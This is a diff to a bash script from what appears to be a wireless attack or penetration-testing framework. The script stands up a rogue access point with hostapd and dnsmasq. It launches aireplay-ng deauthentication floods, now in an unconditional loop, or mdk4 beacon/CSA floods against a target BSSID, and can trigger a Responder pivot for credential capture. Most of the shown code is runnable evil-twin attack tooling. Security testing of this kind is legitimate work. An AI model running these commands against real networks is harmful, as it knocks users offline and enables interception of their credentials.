@@ -92,8 +92,22 @@ cleanup() {
     [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
     [[ -n "${DNSMASQ_PID:-}" ]] && kill "$DNSMASQ_PID" 2>/dev/null || true
     [[ -n "${CAT_PID:-}" ]] && kill "$CAT_PID" 2>/dev/null || true
+    [[ -n "${TEL_PID:-}" ]] && kill "$TEL_PID" 2>/dev/null || true
 }
 trap cleanup EXIT
+
+# Start dynamic telemetry heartbeat
+(
+    ELAPSED=0
+    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
+        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
+        STATUS="AP Active (monitoring roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
+        sleep 5
+        ((ELAPSED+=5))
+    done
+) &
+TEL_PID=$!
 
 echo -e "[*] Starting services (NAT established by Brain)..."
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
@@ -103,18 +117,11 @@ else
 fi
 DNSMASQ_PID=$!
 
-if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-    hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" &
-else
-    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
-fi
-HOSTAPD_PID=$!
-
-# Roaming Catalyst Execution
+# Roaming Catalyst Execution (Pre-launch for Window Mode)
 if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
     echo -e "[*] Starting ${C_BOLD}Surgical Deauth Catalyst${C_RESET} against $TARGET_BSSID..."
     (
-        while kill -0 $HOSTAPD_PID 2>/dev/null; do
+        while true; do
             if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
                 aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
             else
@@ -124,16 +131,24 @@ if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
         done
     ) &
     CAT_PID=$!
-elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]]; then
-    if command -v mdk4 &>/dev/null; then
-        echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID..."
-        if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-            mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} &
-        else
-            mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} > /dev/null 2>&1 &
-        fi
-        CAT_PID=$!
+elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]] && command -v mdk4 &>/dev/null; then
+    echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID..."
+    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+        mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} &
+    else
+        mdk4 "$INTERFACE" b -n "$SSID" -c ${GUEST_CHANNEL:-6} > /dev/null 2>&1 &
     fi
+    CAT_PID=$!
+fi
+
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # FOREGROUND
+    timeout "$SCAN_TIME" hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" || true
+else
+    # BACKGROUND
+    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
+    HOSTAPD_PID=$!
+    sleep "$SCAN_TIME"
 fi
 
 # Responder Support Module
@@ -141,17 +156,6 @@ if [[ "$LAUNCH_RESPONDER" == "yes" ]]; then
     echo -e "[*] Requesting background Responder pivot..."
     "$ASTRA_BIN" launch-support --tc "G6" --session-dir "$SESSION_DIR"
 fi
-
-# 3. Progress Tracking
-ELAPSED=0
-while [[ $ELAPSED -lt $SCAN_TIME ]]; do
-    PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
-    STATUS="AP Active (monitoring roams)... ($(( SCAN_TIME - ELAPSED ))s left)"
-    "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
-    
-    sleep 5
-    ((ELAPSED+=5))
-done
 
 cleanup
 trap - EXIT
